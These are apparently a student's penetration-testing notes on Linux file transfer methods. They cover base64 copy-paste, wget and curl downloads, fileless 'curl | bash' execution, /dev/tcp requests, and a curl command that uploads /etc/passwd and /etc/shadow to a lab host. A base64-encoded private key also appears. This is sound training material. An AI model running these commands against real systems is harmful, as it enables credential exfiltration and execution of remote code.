--- title: "File transfers Linux"
weight: 26
---
![8ffc355cd35d2a919c0c8efc4802f8bd.png](/resources/8ffc355cd35d2a919c0c8efc4802f8bd.png)

&nbsp;

&nbsp;

Transffering file using base64 copy  paste

#### Pwnbox - Check File MD5 hash

```shell-session
cube111@local[/local]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

&nbsp;

```shell-session
cat id_rsa |base64 -w 0;echo

LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
```

&nbsp;

We copy this content, paste it onto our Linux target machine, and use `base64` with the option `-d' to decode it.

#### Linux - Decode the File

```shell-session
cube111@local[/local]$ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUF
```

&nbsp;

&nbsp;

#### Linux - Confirm the MD5 Hashes Match

```shell-session
cube111@local[/local]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

&nbsp;

&nbsp;

To download a file using `wget`, we need to specify the URL and the option `-O' to set the output filename.

#### Download a File Using wget

```shell-session
cube111@local[/local]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

&nbsp;

`cURL` is very similar to `wget`, but the output filename option is lowercase `-o'.

#### Download a File Using cURL

```shell-session
cube111@local[/local]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

&nbsp;

&nbsp;

#### Fileless Download with cURL

```shell-session
cube111@local[/local]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

Similarly, we can download a Python script file from a web server and pipe it into the Python binary. Let's do that, this time using `wget`.

#### Fileless Download with wget

```shell-session
cube111@local[/local]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

Hello World!
```

&nbsp;

&nbsp;

## Download with Bash (/dev/tcp)

There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.

#### Connect to the Target Webserver

&nbsp;

```shell-session
cube111@local[/local]$ exec 3<>/dev/tcp/10.10.10.32/80
```

&nbsp;

#### HTTP GET Request

```shell-session
cube111@local[/local]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

&nbsp;

#### Print the Response

```shell-session
cube111@local[/local]$ cat <&3
```

&nbsp;

&nbsp;

#### Linux - Downloading Files Using SCP

```shell-session
cube111@local[/local]$ scp plaintext@192.168.49.128:/root/myroot.txt .
```

&nbsp;

&nbsp;

## Upload Operations

&nbsp;

&nbsp;

## Web Upload

As mentioned in the `Windows File Transfer Methods` section, we can use [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the Python `HTTP.Server` module, which includes a file upload page. For this Linux example, let's see how we can configure the `uploadserver` module to use `HTTPS` for secure communication.

The first thing we need to do is to install the `uploadserver` module.

#### Pwnbox - Start Web Server

```shell-session
cube111@local[/local]$ sudo python3 -m pip install --user uploadserver

Collecting uploadserver
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```

&nbsp;

#### Pwnbox - Create a Self-Signed Certificate

```shell-session
cube111@local[/local]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

&nbsp;

&nbsp;

```shell-session
cube111@local[/local]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

File upload available at /upload
Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
```

&nbsp;

```shell-session
cube111@local[/local]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

&nbsp;

&nbsp;

#### Linux - Creating a Web Server with Python3

```shell-session
cube111@local[/local]$ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

#### Linux - Creating a Web Server with Python2.7

```shell-session
cube111@local[/local]$ python2.7 -m SimpleHTTPServer

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

#### Linux - Creating a Web Server with PHP

```shell-session
cube111@local[/local]$ php -S 0.0.0.0:8000

[Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started
```

#### Linux - Creating a Web Server with Ruby

```shell-session
cube111@local[/local]$ ruby -run -ehttpd . -p8000

[2022-05-23 09:35:46] INFO  WEBrick 1.6.1
[2022-05-23 09:35:46] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu]
[2022-05-23 09:35:46] INFO  WEBrick::HTTPServer#start: pid=1705 port=8000
```

&nbsp;

&nbsp;

#### Encrypting /etc/passwd with openssl

Protected File Transfers

```shell-session
cube111@local[/local]$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc

enter aes-256-cbc encryption password:                                                         
Verifying - enter aes-256-cbc encryption password:
```

&nbsp;

&nbsp;

#### Decrypt passwd.enc with openssl

Protected File Transfers

```shell-session
cube111@local[/local]$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

&nbsp;

&nbsp;

&nbsp;

MAKE A TLS SERVER

&nbsp;

import http.server  
import ssl

\# Define the server address and port  
server_address = ('0.0.0.0', 40000) # Listen on all interfaces, port 4443

\# Create an HTTP server  
httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)

\# Wrap the server socket with SSL  
httpd.socket = ssl.wrap_socket(  
    httpd.socket,  
    keyfile="key.pem", # Path to the private key  
    certfile="cert.pem", # Path to the certificate  
    server_side=True,  
    ssl_version=ssl.PROTOCOL_TLSv1_2  
)

print(f"Starting HTTPS server on https://{server_address\[0\]}:{server_address\[1\]}")  
httpd.serve_forever()
